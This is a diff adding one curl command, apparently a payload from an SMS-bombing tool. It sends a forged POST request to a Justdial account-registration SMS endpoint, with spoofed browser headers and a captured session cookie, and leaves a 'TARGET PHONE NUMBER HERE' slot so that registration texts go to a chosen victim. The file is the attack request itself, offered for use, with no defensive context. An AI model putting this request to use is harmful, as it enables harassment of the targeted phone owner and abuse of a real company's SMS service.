@@ -1,0 +1,11 @@
+curl -X POST -H "Host:accounts.justdial.com" -H "Connection:keep-alive" -H "Content-Length:18"
+-H "Accept:application/json, text/javascript, */*; q=0.01" -H "Origin:http://accounts.justdial.com"
+-H "X-Requested-With:XMLHttpRequest" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo
+1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36" -H
+"Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H
+"Referer:http://accounts.justdial.com/hr_dashboard_services/jdtest/register?mobile=
+NzYyMTA1Nzk0MQ==&id=MC4zMTU5MDkwMCAxNTY4NzAxODUyfEB8K%2FlonurGfX0%3D&city
+=" -H "Accept-Encoding:gzip, deflate" -H
+"Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H
+"Cookie:PHPSESSID=9ov0jkdfs1k3ipph0pi3nb9aa4" -d 'mob_num=TARGET PHONE NUMBER HERE'
+"http://accounts.justdial.com/hr_dashboard_services/jdtest/sendsms_registration"
